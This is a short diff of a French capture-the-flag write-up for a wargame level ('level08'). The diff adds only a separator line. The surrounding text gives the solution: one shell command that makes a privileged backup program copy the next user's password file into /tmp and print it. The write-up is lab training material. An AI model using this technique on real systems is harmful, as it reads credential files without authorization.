@@ -12,4 +12,8 @@ Problème : ne peut pas utiliser gdb car backups + .log appartient à level09
 
 Solution :
 
+
+=======================================================================================================================================
+
+
 cd /tmp; mkdir -p backups/home/users/level09/; ~/level08 /home/users/level09/.pass; cat ./backups/home/users/level09/.pass; cd ~;
